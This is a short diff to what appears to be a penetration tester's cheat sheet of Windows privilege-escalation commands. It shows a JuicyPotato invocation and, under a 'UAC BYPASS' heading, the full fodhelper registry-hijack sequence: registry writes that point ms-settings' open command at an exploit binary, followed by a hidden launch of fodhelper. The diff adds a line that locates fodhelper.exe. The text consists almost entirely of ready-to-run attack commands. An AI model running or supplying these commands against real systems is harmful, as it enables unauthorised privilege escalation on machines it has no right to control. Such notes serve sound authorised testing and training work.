@@ -903,8 +903,11 @@ JuicyPotato.exe -t * -p {run.exe} -l 8003
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
 # UAC BYPASS
+where /r C:\windows fodhelper.exe
+
  New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+
 cmd -> fodhelper
 
 powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
